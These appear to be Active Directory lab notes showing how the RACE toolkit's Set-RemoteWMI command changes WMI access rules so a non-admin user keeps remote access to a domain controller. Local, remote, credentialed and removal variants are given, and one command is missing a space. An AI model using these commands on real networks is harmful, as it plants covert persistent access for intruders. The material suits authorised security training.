* ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
```
C:\AD\Tools\RACE-master\RACE.ps1
```

* On local machine for student1:
```
Set-RemoteWMI -SamAccountName student1 -Verbose
```

* On remote machine for student1 without explicit credentials:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

* On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
```

* On remote machine remove permissions:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

